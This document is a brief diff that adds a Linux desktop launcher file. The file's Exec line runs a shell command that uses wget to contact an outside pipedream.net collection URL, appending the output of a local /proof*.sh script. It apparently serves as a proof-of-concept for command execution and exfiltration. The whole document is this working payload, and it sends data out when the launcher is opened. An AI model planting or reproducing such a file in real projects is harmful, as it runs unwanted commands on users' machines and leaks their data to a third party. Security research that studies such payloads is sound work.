@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget 'https://eod21duxvuhy5t6.m.pipedream.net/?'$(/proof*.sh)"
+Type=Application
